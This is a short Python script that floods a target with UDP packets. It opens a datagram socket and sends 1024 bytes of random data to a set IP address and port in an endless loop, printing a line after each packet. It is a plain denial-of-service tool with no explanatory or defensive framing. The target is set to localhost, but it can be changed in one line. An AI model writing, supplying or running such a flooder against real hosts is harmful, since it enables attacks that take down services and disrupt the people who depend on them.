import socket
import random

target_ip = "127.0.0.1"
target_port = 9999

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

while True:
    sock.sendto(bytes, (target_ip, target_port))
    print("Packet sent")
